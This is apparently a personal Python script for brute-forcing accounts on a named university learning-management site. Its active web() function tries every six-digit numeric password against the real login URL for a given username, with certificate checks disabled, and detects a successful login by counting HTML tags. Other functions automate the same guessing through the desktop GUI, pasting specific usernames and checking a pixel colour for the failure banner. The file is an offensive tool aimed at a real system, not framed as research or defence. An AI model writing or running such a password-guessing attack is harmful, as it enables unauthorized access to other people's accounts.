import itertools
import os
import pyautogui
import pyperclip
import time
import random
import requests
import mechanize
import urllib
import bs4
import urllib3

# LOGIN_TEXTBOX = ()
# PASTE_n_SIGNIN_BUTTON = (1192, 643)
# PSSW_TEXTBOX = (1159, 562)

LOGIN_TEXTBOX_2 = (1516, 584)
PASTE_n_SIGNIN_BUTTON_2 = (1528, 692)
PSSW_TEXTBOX_2 = (1508, 633)
PSSW_PASTE = (1523, 784)
SIGNIN_BUTTON = (1504, 714)

NOT_VALID_COLOR = (247, 221, 220)
NOT_VALID_COORD = (1159, 453)

def main():
	n = 0
	pyautogui.click(1280, 1024)
	swaped = True
	for i in itertools.combinations_with_replacement("0123456789", 6):
		if (n > -1): # 3094
			# pyperclip.copy("EvAA.19")
			# pyautogui.click(LOGIN_TEXTBOX_2[0], LOGIN_TEXTBOX_2[1], clicks = 1, duration = 0.1)
			# pyautogui.click(button = "right")
			# pyautogui.click(PASTE_n_SIGNIN_BUTTON_2[0], PASTE_n_SIGNIN_BUTTON_2[1], duration = 0.1)
			# pyautogui.click(button="left")
			# time.sleep(0.25)
			# pyperclip.copy(str(''.join(i)))
			# pyautogui.click(PSSW_TEXTBOX_2[0], PSSW_TEXTBOX_2[1], clicks = 1, duration = 0.1)
			# pyautogui.click(button = "right")
			# pyautogui.click(PSSW_PASTE[0], PSSW_PASTE[1], duration = 0.1)
			# pyautogui.click(button="left")
			# pyautogui.click(SIGNIN_BUTTON[0], SIGNIN_BUTTON[1], clicks = 1, duration = 0.1)
			# time.sleep(0.5)
			if (swaped):
				pyautogui.press("tab")
				swaped = False
			pyautogui.press("tab")
			pyautogui.press("tab")
			pyperclip.copy("EvAA.19")
			pyautogui.hotkey("ctrl", 'v')
			# pyautogui.press("down")
			# pyautogui.press("enter")
			pyautogui.press("tab")
			# pyautogui.typewrite("123123")
			pyperclip.copy(str(''.join(i)))
			pyautogui.hotkey("ctrl", 'v')
			pyautogui.press("tab")
			pyautogui.press("tab")
			pyautogui.press("enter")
			# input()
			time.sleep(1)
			if  not (pyautogui.pixelMatchesColor(NOT_VALID_COORD[0], NOT_VALID_COORD[1], NOT_VALID_COLOR)):
				print(i, "!!!", str(''.join(i)), "!!!")
				input("WAITING...")
		n += 1
		print(n, str(''.join(i)))

def test():
	pyperclip.copy("RVS.19")
	pyautogui.click(LOGIN_TEXTBOX_2[0], LOGIN_TEXTBOX_2[1], clicks = 1, duration = 1)
	pyautogui.click(button = "right")
	pyautogui.click(PASTE_n_SIGNIN_BUTTON_2[0], PASTE_n_SIGNIN_BUTTON_2[1], clicks=1, duration = 1)
	pyautogui.click(button="left")
	time.sleep(2)
	pyperclip.copy("123123")
	pyautogui.click(PSSW_TEXTBOX_2[0], PSSW_TEXTBOX_2[1], clicks = 1, duration = 1)
	pyautogui.click(button = "right")
	pyautogui.click(PSSW_PASTE[0], PSSW_PASTE[1], duration = 1)
	pyautogui.click(button="left")
	pyautogui.click(SIGNIN_BUTTON[0], SIGNIN_BUTTON[1], clicks = 1, duration = 1)
	time.sleep(3)
	if  not (pyautogui.pixelMatchesColor(NOT_VALID_COORD[0], NOT_VALID_COORD[1], NOT_VALID_COLOR)):
		print(i)
		input("WAITING...")
	pyperclip.copy("RVS.19")
	pyautogui.click(LOGIN_TEXTBOX_2[0], LOGIN_TEXTBOX_2[1], clicks = 3, duration = 0.1)
	pyautogui.click(button = "right")
	pyautogui.click(PASTE_n_SIGNIN_BUTTON_2[0], PASTE_n_SIGNIN_BUTTON_2[1], duration = 0.1)
	pyautogui.click(button="left")
	time.sleep(2)
	pyperclip.copy("000000")
	pyautogui.click(PSSW_TEXTBOX_2[0], PSSW_TEXTBOX_2[1], clicks = 3, duration = 0.1)
	pyautogui.click(button = "right")
	pyautogui.click(PSSW_PASTE[0], PSSW_PASTE[1], duration = 0.1)
	pyautogui.click(button="left")
	pyautogui.click(SIGNIN_BUTTON[0], SIGNIN_BUTTON[1], clicks = 1, duration = 1)
	time.sleep(3)
	if  not (pyautogui.pixelMatchesColor(NOT_VALID_COORD[0], NOT_VALID_COORD[1], NOT_VALID_COLOR)):
		print(i)
		input("WAITING...")
	pyperclip.copy("RVS.19")
	pyautogui.click(LOGIN_TEXTBOX_2[0], LOGIN_TEXTBOX_2[1], clicks = 3, duration = 0.1)
	pyautogui.click(button = "right")
	pyautogui.click(PASTE_n_SIGNIN_BUTTON_2[0], PASTE_n_SIGNIN_BUTTON_2[1], duration = 0.1)
	pyautogui.click(button="left")
	time.sleep(2)
	pyperclip.copy("071087")
	pyautogui.click(PSSW_TEXTBOX_2[0], PSSW_TEXTBOX_2[1], clicks = 3, duration = 0.1)
	pyautogui.click(button = "right")
	pyautogui.click(PSSW_PASTE[0], PSSW_PASTE[1], duration = 0.1)
	pyautogui.click(button="left")
	pyautogui.click(SIGNIN_BUTTON[0], SIGNIN_BUTTON[1], clicks = 1, duration = 1)
	time.sleep(3)
	if  not (pyautogui.pixelMatchesColor(NOT_VALID_COORD[0], NOT_VALID_COORD[1], NOT_VALID_COLOR)):
		print(i)
		input("WAITING...")

def web():
	urllib3.disable_warnings()
	url = "https://lms.uni-dubna.ru/login/"
	session = requests.Session()
	login = input("Login: ")
	# password = input(">> ")
	last_iteration = int(input("Last iteration: ")) # 1372
	iteration = -1
	for i in itertools.product("0123456789", repeat = 6):
		if (iteration > last_iteration):
			password = str(''.join(i))
			page = session.post(url, {'username' : login, 'password' : password,}, verify = False)
			var = bs4.BeautifulSoup(page.text, features="lxml")
			k = 0
			for j in var.recursiveChildGenerator():
				if (j.name):
					k += 1
			if (k > 81):
				os.system("clear")
				print("Current iteration - ", iteration)
				print("Login : {}\nPassword : {}".format(login, password))
				input("ENTER")
			else:
				pass
			iteration += 1
			print(iteration, password)
		else:
			iteration += 1
			print(iteration)
				
	# 	# 
	# 	page = session.post(url, {'username' : target, 'password' : password,}, verify = False)
	# 	# print(page.content)
	# 	
	# 	k = 0
	# 	for j in var.recursiveChildGenerator():
	# 		if j.name:
	# 			# print(j.name)
	# 			k += 1
	# 	print(k)
	# 	if (k > 81):
	# 		print("DONE ", target, password)
	# 	else:
	# 		print("ERROR")
	# page = session.post(url, {'username' : target, 'password' : password,}, verify = False)
	# 	# print(page.content)
	# var = bs4.BeautifulSoup(page.text, features="lxml")
	# k = 0
	# for j in var.recursiveChildGenerator():
	# 	if j.name:
	# 		# print(j.name)
	# 		k += 1
	# print(k)
	# if (k > 81):
	# 	print("DONE\nLogin : {}\nPassword : {}".format(target, password))
	# else:
	# 	print("ERROR")
	
	
	



def screen():
	while True:
		print(pyautogui.position())
		print(pyautogui.pixel(pyautogui.position()[0], pyautogui.position()[1]))
		time.sleep(1)
		os.system("clear")

web()
# screen()
# test()
# main()
# pyperclip.copy("123123")
# print(pyperclip.paste())
# pyautogui.click(PSSW_TEXTBOX_2[0], PSSW_TEXTBOX_2[1], clicks = 1, duration = 0.1)